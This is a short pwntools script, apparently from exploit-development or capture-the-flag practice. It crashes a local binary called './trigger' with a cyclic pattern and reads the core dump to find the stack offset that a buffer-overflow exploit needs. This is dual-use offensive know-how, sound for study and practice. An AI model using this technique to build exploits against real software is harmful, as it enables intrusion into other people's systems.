from pwn import *
p = process('./trigger')
payload = cyclic(200)
p.send(payload)
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
log.info(f"offset = {offset}")